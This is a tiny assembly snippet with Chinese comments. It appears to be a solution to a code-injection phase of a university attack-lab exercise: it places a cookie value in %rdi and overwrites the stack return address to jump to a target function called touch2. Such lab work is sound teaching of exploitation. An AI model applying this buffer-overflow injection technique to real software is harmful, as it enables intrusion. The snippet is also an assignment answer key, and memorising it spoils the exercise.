# 将 cookie 传到 %rdi
# 设置 touch2 的内存地址到 %rsp，然后 ret
    movq $0x59b997fa,%rdi
    movq $0x4017ec,(%rsp)
    ret
